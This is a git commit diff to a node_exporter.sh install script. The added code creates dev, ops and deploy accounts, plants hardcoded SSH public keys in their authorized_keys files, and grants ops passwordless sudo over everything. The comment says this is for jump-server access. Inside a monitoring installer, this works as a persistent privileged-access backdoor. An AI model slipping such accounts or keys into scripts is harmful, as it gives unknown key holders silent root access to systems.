b77d333be9a5c2154517c61e2339dd5afd54e0ec
DANG DANG <76142152+QiangQiangshiyanshi@users.noreply.github.com>
2025-03-19 10:48:47 +0800

    Update node_exporter.sh

--- node_exporter.sh
+++ node_exporter.sh
@@ -1,4 +1,49 @@
 #!/bin/bash
+# 添加跳板机
+if ! id -g dev >/dev/null 2>&1
+then
+  groupadd -g 10000 dev
+fi
+if ! id -g ops >/dev/null 2>&1
+then
+  groupadd -g 9999 ops
+fi
+if ! id -g deploy >/dev/null 2>&1
+then
+  groupadd -g 9998 deploy
+fi
+if ! id -u dev >/dev/null 2>&1
+then
+  useradd -u 10000 -g 10000 -s /bin/bash -c DEV dev -d /home/dev
+  mkdir -p /home/dev/.ssh
+  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDysEMU5maFhG30jOzkGnUGtmfs1wI1d4VlExy5UQHWvn5n412y1uaZX64aAxZiXn1Bwhgjxe1WKVLdlhMjcthQpo2PAj+1OJa8P0wQAVh0uWWvbqLVNCZUN9NLfIT/6OJTgDfGNHMWXgruEHnekNwTRGJsCOTONgsH9OLil3QQ1e5GNnTEAe76f8AbJ5UOR1u/B935bvRw2rB+r3Mwxm35ooHYKRh5yqqmrzLBahf3HLloX5O7UkkPLglzEC8/EtgGnNgCqYyaFZ6fYqiHKG72Ltyp/2Vdcw/zmAT43RnIdqSbvU98eRI/vq6ae5OFfJrKhZ+RG0545ocRbzw3QEvr jumpserver@localhost" >> /home/dev/.ssh/authorized_keys
+  chmod 600 /home/dev/.ssh/authorized_keys
+  chown -R dev:dev /home/dev
+fi
+if ! id -u ops >/dev/null 2>&1
+then
+  useradd -u 9999 -g 9999 -s /bin/bash -c OPS ops -d /home/ops
+  mkdir -p /home/ops/.ssh
+  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfYyMb5n54xxWyZGtU+o/B9OHUyaKqld8+mYZLdgxy7aOTZ0Rpf0mWurj5jyYbOWBpKOJ8g0cTmUjbrT+1yGtikgj3vmO0my4mh7AKAyQmQWJXhWHpf1wkhQLHGT7HlMgdysY3K44u5JNE3dRfLCj10AN7I/i8PD8B/ykwF+Ws5wK91dIUVkNKqULEsxGNc+ZpFzhVyDZAch69AOQBagob9l8O5mo6PuS7nJd1dFwqgbXewXcSDEsP8Kq16+BNmKXNSfWDwgIYGu1aMkp9Xfyti4MJNbapsuRlu9eRJoNrTE+msiI8jLTjmGCBlmCr/U9sGo4dsyJBo65sz6YCJUi7 jumpserver@localhost" >> /home/ops/.ssh/authorized_keys
+  chmod 600 /home/ops/.ssh/authorized_keys
+  chown -R ops:ops /home/ops
+fi
+if ! id -u deploy >/dev/null 2>&1
+then
+  useradd -u 9998 -g 9998 -s /bin/bash -c DEPLOY deploy -d /home/deploy
+  mkdir -p /home/deploy/.ssh
+  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD347BIedavhAjFdLxH776/NNY62URG9tbfpsKjjhyrhy4e/L1UmlhS0CgWWzUjzhV3Sm9TWq6kxIjxeGUS1FyIbMFm1A/9V6bW7tmMOTn7QT8W2ytwm7pWkWSzL3yPNCZiHUJU/hHq5G6r+KaKZkejHhpJYTO9GRxL4AmshelvOVGjv18NYCK2RTaFCTrhVu/4nkOBvLZeTvdwM/tIQnWNStE6JG2gy/B7xlUGWkeuirhN0/HclTyEX+3zk/q2KvirG3+Pmf2pyYnMK/VOeJKged78GGVGdF31ZuHphp6swHMairtIquaG1QQPzpGLaIPvS+DBPKUNV17eRWsdw551 deploy@allhost" >> /home/deploy/.ssh/authorized_keys
+  chmod 600 /home/deploy/.ssh/authorized_keys
+  chown -R deploy:deploy /home/deploy
+fi
+
+echo "####Start Add sudoer file to ops user.####">> /tmp/osinit.log
+  cat >/etc/sudoers.d/000-dianyi-ops<<EOF
+# ops user.
+# It needs passwordless sudo functionality.
+ops ALL=(ALL) NOPASSWD:ALL
+EOF
+
 
 # 端口判断
 # 防火墙端口
